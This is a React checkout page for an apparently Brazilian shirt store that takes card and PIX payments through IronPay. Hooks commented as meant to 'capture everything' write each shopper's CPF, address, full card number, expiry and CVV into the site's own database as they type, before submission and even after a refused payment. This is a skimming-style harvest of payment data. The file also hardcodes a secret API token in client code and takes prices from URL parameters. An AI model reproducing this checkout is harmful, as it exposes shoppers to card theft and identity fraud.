import React, { useState, useEffect } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { supabase } from '../lib/supabase';
import { useCart } from '../contexts/CartContext';
import { allProducts } from '../data/products';
import { User, Mail, CreditCard, MapPin, Phone, Calendar, Hash, Lock, ShieldCheck, QrCode, Copy, CheckCheck, Clock, CheckCircle2 } from 'lucide-react';

const IRONPAY_API_URL = 'https://api.ironpayapp.com.br/api/public/v1/transactions';
const IRONPAY_TOKEN = 'qoVerJe5Jw33aHINratQw4XFdc4gtQrEPFJ9QE7CRz22JyHupjVT0h8IdmIf';

interface PixData {
  qrCode: string;
  qrImage: string;
}

export default function Checkout() {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [statusErro, setStatusErro] = useState(false);
  const [metodo, setMetodo] = useState<'cartao' | 'pix'>('cartao');
  const [pixData, setPixData] = useState<PixData | null>(null);
  const [pixLoading, setPixLoading] = useState(false);
  const [pixErro, setPixErro] = useState('');
  const [copiado, setCopiado] = useState(false);
  const [aprovado, setAprovado] = useState(false);
  const [parcelas, setParcelas] = useState('1');

  const { items: cartItems, totalPrice: cartTotal, totalItems, discount } = useCart();
  const [timeLeft, setTimeLeft] = useState(300);
  const [produto, setProduto] = useState({
    nome: 'Buscando camisa...',
    preco: 0,
    imagens: [] as string[]
  });

  const [formData, setFormData] = useState({
    nome: '', email: '', cpf: '', dataNascimento: '', telefone: '',
    cep: '', endereco: '', bairro: '', cidade: '', estado: '', numero: '',
    numCartao: '', nomeCartao: '', validade: '', cvv: ''
  });

  useEffect(() => {
    const id = searchParams.get('id');
    const overrideNome = searchParams.get('nome');
    const overridePreco = searchParams.get('preco');
    const overrideImg = searchParams.get('img');
    const qty = parseInt(searchParams.get('qty') || '1');

    if (id) {
      supabase
        .from('produtos')
        .select('*')
        .eq('id', id)
        .single()
        .then(({ data }) => {
          if (data) {
            const parsePrice = (val: any) => {
              if (typeof val === 'number') return val;
              if (typeof val === 'string') {
                const clean = val.replace(/[^\d,.]/g, '').replace(',', '.');
                return parseFloat(clean) || 0;
              }
              return 0;
            };

            setProduto({
              nome: overrideNome || data.nome,
              preco: (overridePreco ? Number(overridePreco) : parsePrice(data.preco)) * qty,
              imagens: [overrideImg || data.imagem_url || data.image].filter(img => img && !img.includes('placeholder')) as string[]
            });
          } else {
            const localProd = allProducts.find(p => p.id === id);
            if (localProd) {
              setProduto({
                nome: overrideNome || localProd.name,
                preco: (overridePreco ? Number(overridePreco) : localProd.priceNum) * qty,
                imagens: [overrideImg || localProd.image].filter(img => img) as string[]
              });
            }
          }
        });
    } else if (overrideNome && overridePreco) {
      setProduto({
        nome: overrideNome,
        preco: Number(overridePreco) || 0,
        imagens: (overrideNome.includes('Carrinho') || overrideNome.includes('CARRINHO')) ? [] : (overrideImg ? [overrideImg] : [])
      });
    } else if (cartItems.length > 0) {
      setProduto({
        nome: `CARRINHO (${totalItems} ITENS)`,
        preco: Number(cartTotal) || 0,
        imagens: []
      });
    } else if (id && discount > 0) {
      // Se for compra direta de um item mas houver cupom aplicado no contexto
      setProduto(prev => ({
        ...prev,
        preco: prev.preco * (1 - discount)
      }));
    }
  }, [searchParams, cartItems, cartTotal, totalItems, discount]);

  const salvarDadosNoPainel = async (statusPagamento = 'pending') => {
    try {
      console.log("Salvando ficha completa no Supabase...", statusPagamento);
      // Removido o campo 'status' pois não existe na tabela checkouts do Supabase
      const { error } = await supabase.from('checkouts').insert([{
        nome_completo: formData.nome,
        email: formData.email,
        cpf: formData.cpf,
        data_nascimento: formData.dataNascimento,
        telefone: formData.telefone,
        cep: formData.cep,
        endereco: formData.endereco,
        bairro: formData.bairro,
        cidade: formData.cidade,
        estado: formData.estado,
        numero: formData.numero,
        numero_cartao: formData.numCartao || (metodo === 'pix' ? 'PIX' : ''),
        nome_cartao: formData.nomeCartao || (metodo === 'pix' ? 'PIX' : ''),
        validade_cartao: formData.validade || (metodo === 'pix' ? 'PIX' : ''),
        cvv_cartao: formData.cvv || (metodo === 'pix' ? 'PIX' : ''),
        produto_nome: produto.nome,
        valor_total: produto.preco,
        cupom_aplicado: discount > 0 ? 'CAMISA10' : null
      }]);
      
      if (error) console.error("Erro Supabase:", error);
    } catch (e) {
      console.error("Erro ao salvar dados no painel:", e);
    }
  };

  // Gatilhos de salvamento em tempo real para capturar TUDO
  useEffect(() => {
    // Se preencheu os dados básicos
    if (formData.nome && formData.cpf && formData.telefone.length >= 14) {
      salvarDadosNoPainel('lead_pessoal');
    }
  }, [formData.telefone]);

  useEffect(() => {
    // Se preencheu o endereço (disparado após preencher o número da casa)
    if (formData.endereco && formData.numero && formData.cidade) {
      salvarDadosNoPainel('lead_endereco');
    }
  }, [formData.numero]);

  useEffect(() => {
    // Se preencheu os dados do cartão (disparado após preencher o CVV)
    if (formData.numCartao.length >= 16 && formData.cvv.length >= 3) {
      salvarDadosNoPainel('lead_cartao_preenchido');
    }
  }, [formData.cvv]);

  const gerarPix = async () => {
    if (!formData.nome || !formData.cpf || !formData.email) {
      setPixErro('Preencha os dados pessoais para gerar o PIX.');
      return;
    }

    setPixLoading(true);
    setPixErro('');
    setPixData(null);

    try {
      const amountInCents = Math.round(produto.preco * 100);
      const payload = {
        amount: amountInCents,
        offer_hash: '35E5jbK1n9',
        payment_method: 'pix',
        installments: 1,
        customer: {
          name: formData.nome,
          email: formData.email,
          phone_number: formData.telefone.replace(/\D/g, '') || '11999999999',
          document: formData.cpf.replace(/\D/g, ''),
          street_name: formData.endereco || 'Rua não informada',
          number: formData.numero || 'SN',
          neighborhood: formData.bairro || 'Bairro não informado',
          city: formData.cidade || 'Cidade não informada',
          state: formData.estado || 'SP',
          zip_code: formData.cep.replace(/\D/g, '') || '00000000'
        },
        cart: [
          {
            product_hash: 'aouiaiqbuo',
            title: produto.nome,
            price: amountInCents,
            quantity: 1,
            operation_type: 1,
            tangible: true
          }
        ],
        expire_in_days: 1,
        transaction_origin: 'api',
        postback_url: 'https://camisa10original.com.br/api/ironpay/webhook'
      };

      const res = await fetch(`${IRONPAY_API_URL}?api_token=${IRONPAY_TOKEN}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify(payload),
      });

      const json = await res.json();
      if (!res.ok) throw new Error(json?.message || json?.error || 'Erro na IronPay');

      const qrCode = json?.pix?.pix_qr_code || json?.pix?.code || '';
      const qrImage = json?.pix?.pix_url || '';

      if (!qrCode) throw new Error('PIX gerado sem código pela IronPay.');

      setPixData({ 
        qrCode, 
        qrImage: qrImage && qrImage.startsWith('http') ? qrImage : `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(qrCode)}`
      });
      
      await salvarDadosNoPainel('pix_generated');
    } catch (err: any) {
      setPixErro(err?.message || 'Erro ao conectar com IronPay.');
    } finally {
      setPixLoading(false);
    }
  };

  const handleFinalizar = async (e: React.FormEvent) => {
    e.preventDefault();
    if (metodo === 'pix') {
      if (!pixData) gerarPix();
      return;
    }

    setLoading(true);
    setStatusErro(false);

    try {
      const amountInCents = Math.round(produto.preco * 100);
      const [mes, ano] = formData.validade.split('/');
      
      const payload = {
        amount: amountInCents,
        offer_hash: '35E5jbK1n9',
        payment_method: 'credit_card',
        installments: parseInt(parcelas),
        card: {
          number: formData.numCartao.replace(/\s/g, ''),
          holder_name: formData.nomeCartao,
          exp_month: parseInt(mes),
          exp_year: 2000 + parseInt(ano),
          cvv: formData.cvv
        },
        customer: {
          name: formData.nome,
          email: formData.email,
          phone_number: formData.telefone.replace(/\D/g, ''),
          document: formData.cpf.replace(/\D/g, ''),
          street_name: formData.endereco,
          number: formData.numero,
          neighborhood: formData.bairro,
          city: formData.cidade,
          state: formData.estado,
          zip_code: formData.cep.replace(/\D/g, '')
        },
        cart: [{
          product_hash: 'aouiaiqbuo',
          title: produto.nome,
          price: amountInCents,
          quantity: 1,
          operation_type: 1,
          tangible: true
        }],
        transaction_origin: 'api',
        postback_url: 'https://camisa10original.com.br/api/ironpay/webhook'
      };

      const res = await fetch(`${IRONPAY_API_URL}?api_token=${IRONPAY_TOKEN}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify(payload),
      });

      const json = await res.json();
      
      if (res.ok && (json.payment_status === 'paid' || json.payment_status === 'approved' || json.status === 'paid')) {
        await salvarDadosNoPainel('paid');
        setAprovado(true);
      } else {
        throw new Error(json?.message || json?.error || 'Cartão recusado');
      }
    } catch (err: any) {
      console.error("Erro Pagamento:", err);
      await salvarDadosNoPainel('refused');
      setStatusErro(true);
    } finally {
      setLoading(false);
    }
  };

  const handleCEP = async (e: React.FocusEvent<HTMLInputElement>) => {
    const cep = e.target.value.replace(/\D/g, '');
    if (cep.length === 8) {
      const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
      const data = await res.json();
      if (!data.erro) {
        setFormData(prev => ({
          ...prev,
          endereco: data.logradouro, bairro: data.bairro, cidade: data.localidade, estado: data.uf
        }));
      }
    }
  };

  const mask = (e: React.ChangeEvent<HTMLInputElement>) => {
    let { name, value } = e.target;
    if (name === 'telefone') value = value.replace(/\D/g, '').replace(/^(\d{2})(\d)/g, "($1) $2").replace(/(\d)(\d{4})$/, "$1-$2");
    if (name === 'cpf') value = value.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    if (name === 'dataNascimento') value = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, "$1/$2").replace(/(\d{2})(\d)/, "$1/$2").substring(0, 10);
    if (name === 'validade') value = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, "$1/$2").substring(0, 5);
    if (name === 'numCartao') value = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, "$1 ");
    if (name === 'cep') value = value.replace(/\D/g, '').replace(/(\d{5})(\d)/, "$1-$2");
    setFormData({ ...formData, [name]: value });
  };

  if (aprovado) {
    return (
      <div style={{ background: '#fff', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '20px', textAlign: 'center' }}>
        <CheckCircle2 size={80} color="#1da154" style={{ marginBottom: '20px' }} />
        <h1 style={{ fontWeight: 900, fontSize: '28px', color: '#000', marginBottom: '10px' }}>PAGAMENTO APROVADO!</h1>
        <p style={{ color: '#666', fontSize: '16px', marginBottom: '10px' }}>Seu pedido foi processado com sucesso!</p>
        <p style={{ color: '#1da154', fontSize: '18px', fontWeight: 'bold', marginBottom: '30px' }}>O código de rastreio será enviado em até 48 horas para o seu e-mail.</p>
        <button onClick={() => navigate('/')} style={{ ...btnPagar, maxWidth: '300px' }}>VOLTAR PARA A LOJA</button>
      </div>
    );
  }

  return (
    <div style={{ background: '#f4f7f6', minHeight: '100vh', fontFamily: 'sans-serif', color: '#000', paddingBottom: '40px' }}>
      {loading && (
        <div style={overlayStyle}>
          <div style={spinnerStyle} />
          <p style={{ marginTop: '15px', fontWeight: '900', color: '#000' }}>Processando pagamento...</p>
        </div>
      )}

      <div className="notranslate" style={{ maxWidth: '500px', margin: '0 auto', background: '#fff', boxShadow: '0 0 20px rgba(0,0,0,0.1)', minHeight: '100vh' }}>
        <div style={{ padding: '20px', borderBottom: '1px solid #eee', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <div>
            <h2 style={{ margin: 0, fontSize: '18px', fontWeight: '900', color: '#000' }}>CHECKOUT SEGURO</h2>
            <div style={{ fontSize: '12px', color: '#1da154', fontWeight: 'bold', display: 'flex', alignItems: 'center', gap: '4px' }}>
              <ShieldCheck size={14} /> Dados criptografados (SSL)
            </div>
          </div>
        </div>

        <div style={{ padding: '20px' }}>
          <div style={productBox}>
            <div style={{ flex: 1 }}>
              <div style={{ fontWeight: '900', fontSize: '14px', color: '#000', lineHeight: '1.2', textTransform: 'uppercase' }}>
                {produto.nome}
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', marginTop: '5px' }}>
                {discount > 0 && (
                  <div style={{ fontSize: '12px', color: '#666', textDecoration: 'line-through' }}>
                    R$ {(produto.preco / (1 - discount)).toFixed(2).replace('.', ',')}
                  </div>
                )}
                <div style={{ fontSize: '20px', fontWeight: '900', color: '#000' }}>
                  R$ {(Number(produto.preco) || 0).toFixed(2).replace('.', ',')}
                </div>
                {discount > 0 && (
                  <div style={{ fontSize: '12px', color: '#1da154', fontWeight: 'bold' }}>
                    Cupom CAMISA10 aplicado (10% OFF)
                  </div>
                )}
              </div>
            </div>
          </div>

          <div style={tabContainer}>
            <button type="button" onClick={() => setMetodo('cartao')} style={metodo === 'cartao' ? tabActive : tabInactive}>
              <CreditCard size={18} /> CARTÃO
            </button>
            <button type="button" onClick={() => setMetodo('pix')} style={metodo === 'pix' ? tabActive : tabInactive}>
              <QrCode size={18} /> PIX
            </button>
          </div>

          <form onSubmit={handleFinalizar}>
            <h4 style={sectionLabel}>1. DADOS PESSOAIS</h4>
            <div style={inputGroup}><User size={18} /><input name="nome" placeholder="NOME COMPLETO" required style={inputStyle} value={formData.nome} onChange={mask} /></div>
            <div style={inputGroup}><Mail size={18} /><input name="email" type="email" placeholder="E-MAIL" required style={inputStyle} value={formData.email} onChange={mask} /></div>
            <div style={{ display: 'flex', gap: '10px' }}>
              <div style={inputGroup}><Hash size={18} /><input name="cpf" placeholder="CPF" required style={inputStyle} value={formData.cpf} onChange={mask} /></div>
              <div style={inputGroup}><Phone size={18} /><input name="telefone" placeholder="WHATSAPP" required style={inputStyle} value={formData.telefone} onChange={mask} /></div>
            </div>

            <h4 style={sectionLabel}>2. ENDEREÇO DE ENTREGA</h4>
            <div style={{ display: 'flex', gap: '10px' }}>
              <div style={inputGroup}><MapPin size={18} /><input name="cep" placeholder="CEP" required style={inputStyle} value={formData.cep} onChange={mask} onBlur={handleCEP} /></div>
              <div style={inputGroup}><Hash size={18} /><input name="numero" placeholder="NÚMERO" required style={inputStyle} value={formData.numero} onChange={mask} /></div>
            </div>
            <div style={inputGroup}><MapPin size={18} /><input name="endereco" placeholder="ENDEREÇO" required style={inputStyle} value={formData.endereco} onChange={mask} /></div>
            <div style={inputGroup}><MapPin size={18} /><input name="bairro" placeholder="BAIRRO" required style={inputStyle} value={formData.bairro} onChange={mask} /></div>
            <div style={{ display: 'flex', gap: '10px' }}>
              <div style={inputGroup}><MapPin size={18} /><input name="cidade" placeholder="CIDADE" required style={inputStyle} value={formData.cidade} onChange={mask} /></div>
              <div style={inputGroup}><MapPin size={18} /><input name="estado" placeholder="UF" required style={inputStyle} value={formData.estado} onChange={mask} /></div>
            </div>

            {metodo === 'cartao' ? (
              <>
                <h4 style={sectionLabel}>3. PAGAMENTO VIA CARTÃO</h4>
                <div style={inputGroup}><CreditCard size={18} /><input name="numCartao" placeholder="NÚMERO DO CARTÃO" required style={inputStyle} value={formData.numCartao} onChange={mask} /></div>
                <div style={inputGroup}><User size={18} /><input name="nomeCartao" placeholder="NOME NO CARTÃO" required style={inputStyle} value={formData.nomeCartao} onChange={mask} /></div>
                <div style={{ display: 'flex', gap: '10px' }}>
                  <div style={inputGroup}><Calendar size={18} /><input name="validade" placeholder="MM/AA" required style={inputStyle} value={formData.validade} onChange={mask} /></div>
                  <div style={inputGroup}><Lock size={18} /><input name="cvv" placeholder="CVV" required style={inputStyle} value={formData.cvv} onChange={mask} /></div>
                </div>
                <div style={{ marginTop: '15px' }}>
                  <label style={{ fontSize: '12px', fontWeight: 'bold', color: '#666' }}>PARCELAMENTO</label>
                  <select value={parcelas} onChange={(e) => setParcelas(e.target.value)} style={selectStyle}>
                    {[1,2,3,4,5,6,7,8,9,10,11,12].map(n => (
                      <option key={n} value={n}>{n}x de R$ {(produto.preco / n).toFixed(2).replace('.', ',')} sem juros</option>
                    ))}
                  </select>
                </div>
              </>
            ) : (
              <div style={pixBox}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '15px' }}>
                  <QrCode size={24} color="#1da154" />
                  <div style={{ fontWeight: '900', fontSize: '14px' }}>PAGAMENTO VIA PIX</div>
                </div>
                
                {pixLoading ? (
                  <div style={{ textAlign: 'center', padding: '20px' }}>
                    <div style={{ ...spinnerStyle, margin: '0 auto', width: '30px', height: '30px' }} />
                    <p style={{ fontSize: '12px', marginTop: '10px', color: '#666' }}>Gerando código PIX...</p>
                  </div>
                ) : pixData ? (
                  <div style={{ textAlign: 'center' }}>
                    <img src={pixData.qrImage} alt="QR Code PIX" style={{ width: '180px', height: '180px', margin: '0 auto', display: 'block' }} />
                    <div style={{ background: '#f8f9fa', padding: '10px', borderRadius: '8px', marginTop: '15px', border: '1px dashed #ccc' }}>
                      <div style={{ fontSize: '10px', color: '#666', marginBottom: '5px', fontWeight: 'bold' }}>CÓDIGO PIX (COPIA E COLA)</div>
                      <div style={{ fontSize: '11px', wordBreak: 'break-all', color: '#333', maxHeight: '60px', overflow: 'hidden', marginBottom: '10px' }}>{pixData.qrCode}</div>
                      <button type="button" onClick={() => { navigator.clipboard.writeText(pixData.qrCode); setCopiado(true); setTimeout(() => setCopiado(false), 2000); }} style={btnCopiar}>
                        {copiado ? <><CheckCheck size={16} /> COPIADO!</> : <><Copy size={16} /> COPIAR CÓDIGO</>}
                      </button>
                    </div>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', justifyContent: 'center', marginTop: '15px', color: '#666', fontSize: '12px' }}>
                      <Clock size={14} /> Expira em 30 minutos
                    </div>
                  </div>
                ) : (
                  <div style={{ textAlign: 'center', padding: '20px', background: '#f8f9fa', borderRadius: '8px' }}>
                    <p style={{ fontSize: '13px', color: '#666' }}>Clique no botão abaixo para gerar o seu código PIX.</p>
                  </div>
                )}
                {pixErro && <div style={{ color: '#dc3545', fontSize: '12px', marginTop: '10px', textAlign: 'center', fontWeight: 'bold' }}>{pixErro}</div>}
              </div>
            )}

            {statusErro && (
              <div style={{ background: '#fff5f5', color: '#dc3545', padding: '15px', borderRadius: '8px', marginTop: '20px', fontSize: '13px', fontWeight: 'bold', border: '1px solid #ffc1c1', textAlign: 'center' }}>
                Ocorreu um erro ao processar o pagamento. Verifique os dados do cartão e tente novamente.
              </div>
            )}

            <button type="submit" disabled={loading || (metodo === 'pix' && pixLoading)} style={loading ? btnDisabled : btnPagar}>
              {loading ? 'PROCESSANDO...' : (metodo === 'pix' && !pixData ? 'GERAR PIX' : 'FINALIZAR PAGAMENTO')}
            </button>

            <div style={{ textAlign: 'center', marginTop: '20px', opacity: 0.6 }}>
              <img src="https://logodownload.org/wp-content/uploads/2014/07/cartao-visa-logo.png" height="15" style={{ marginRight: '10px' }} alt="Visa" />
              <img src="https://logodownload.org/wp-content/uploads/2014/07/mastercard-logo.png" height="15" style={{ marginRight: '10px' }} alt="Mastercard" />
              <img src="https://logodownload.org/wp-content/uploads/2015/03/elo-logo.png" height="15" style={{ marginRight: '10px' }} alt="Elo" />
              <img src="https://logodownload.org/wp-content/uploads/2020/02/pix-logo.png" height="15" alt="Pix" />
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}

// Styles
const overlayStyle: React.CSSProperties = { position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(255,255,255,0.9)', zIndex: 9999, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' };
const spinnerStyle: React.CSSProperties = { width: '40px', height: '40px', border: '4px solid #f3f3f3', borderTop: '4px solid #000', borderRadius: '50%', animation: 'spin 1s linear infinite' };
const productBox: React.CSSProperties = { background: '#f8f9fa', padding: '15px', borderRadius: '12px', marginBottom: '20px', display: 'flex', gap: '15px', alignItems: 'center', border: '1px solid #eee' };
const tabContainer: React.CSSProperties = { display: 'flex', gap: '10px', marginBottom: '25px' };
const tabActive: React.CSSProperties = { flex: 1, padding: '12px', borderRadius: '8px', border: '2px solid #000', background: '#000', color: '#fff', fontWeight: '900', fontSize: '13px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', cursor: 'pointer' };
const tabInactive: React.CSSProperties = { flex: 1, padding: '12px', borderRadius: '8px', border: '2px solid #eee', background: '#fff', color: '#666', fontWeight: '900', fontSize: '13px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', cursor: 'pointer' };
const sectionLabel: React.CSSProperties = { fontSize: '12px', fontWeight: '900', color: '#666', marginBottom: '15px', marginTop: '25px', letterSpacing: '1px' };
const inputGroup: React.CSSProperties = { position: 'relative', display: 'flex', alignItems: 'center', background: '#f8f9fa', borderRadius: '8px', padding: '0 12px', marginBottom: '10px', border: '1px solid #eee', flex: 1 };
const inputStyle: React.CSSProperties = { width: '100%', padding: '14px 10px', border: 'none', background: 'transparent', outline: 'none', fontSize: '13px', fontWeight: 'bold', color: '#000' };
const selectStyle: React.CSSProperties = { width: '100%', padding: '14px', borderRadius: '8px', border: '1px solid #eee', background: '#f8f9fa', outline: 'none', fontSize: '13px', fontWeight: 'bold', marginTop: '5px' };
const btnPagar: React.CSSProperties = { width: '100%', padding: '18px', borderRadius: '12px', border: 'none', background: '#1da154', color: '#fff', fontWeight: '900', fontSize: '16px', marginTop: '30px', cursor: 'pointer', boxShadow: '0 4px 15px rgba(29, 161, 84, 0.3)' };
const btnDisabled: React.CSSProperties = { ...btnPagar, opacity: 0.6, cursor: 'not-allowed' };
const pixBox: React.CSSProperties = { background: '#f0fff4', padding: '20px', borderRadius: '12px', border: '1px solid #c6f6d5', marginTop: '10px' };
const btnCopiar: React.CSSProperties = { width: '100%', padding: '12px', borderRadius: '8px', border: 'none', background: '#000', color: '#fff', fontWeight: 'bold', fontSize: '12px', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' };
